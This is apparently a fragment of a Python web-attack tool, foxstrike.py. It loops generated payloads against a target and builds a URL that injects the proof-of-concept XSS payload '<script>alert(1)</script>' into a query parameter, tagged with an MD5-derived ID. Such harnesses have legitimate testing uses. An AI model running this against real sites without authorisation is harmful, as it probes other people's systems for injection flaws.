# foxstrike.py
from payload_mutator import generate_payloads
from fox_agent_behavior import simulate_user_behavior

def run_attack(target):
    for p in generate_payloads():
        simulate_user_behavior(target, p)
import hashlib

def hash_payload(payload):
    return hashlib.md5(payload.encode()).hexdigest()[:8]

payload = "<script>alert(1)</script>"
payload_id = hash_payload(payload)
url = f"https://target.com?q={payload}#ID-{payload_id}"
